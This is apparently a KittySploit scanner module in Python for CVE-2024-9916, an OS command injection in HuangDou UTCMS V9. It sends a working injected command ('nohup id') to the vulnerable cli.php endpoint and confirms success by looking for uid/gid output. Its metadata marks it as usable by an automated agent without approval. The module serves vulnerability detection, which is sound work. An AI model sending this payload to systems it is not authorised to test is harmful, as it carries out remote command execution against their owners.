#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability, which was classified as critical, has been found in HuangDou UTCMS V9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'HuangDou UTCMS V9 - OS Command Injection Detection',
        'description': 'A vulnerability, which was classified as critical, has been found in HuangDou UTCMS V9. Affected by this issue is some unknown functionality of the file app/modules/ut-cac/admin/cli.php. The manipulation of the argument o leads to os command injection.The attack may be launched remotely. The exploit has been disclosed to the public and may be used.The vendor was contacted early about this disclosure but did not respond in any way.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'huangdou', 'utc', 'rce', 'php', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://vuldb.com/?ctiid.280244', 'https://nvd.nist.gov/vuln/detail/CVE-2024-9916'],
        'cve': 'CVE-2024-9916',
    }

    def run(self):
        path = '/app/modules/ut-cac/admin/cli.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Origin': '{{RootURL}}', 'Content-Type': 'application/x-www-form-urlencoded'}, data='o=nohup id\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('~]#nohup id run complete.', 'uid=', 'gid=',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='HuangDou UTCMS V9 - OS Command Injection detected', path=path)
            return True
        return False

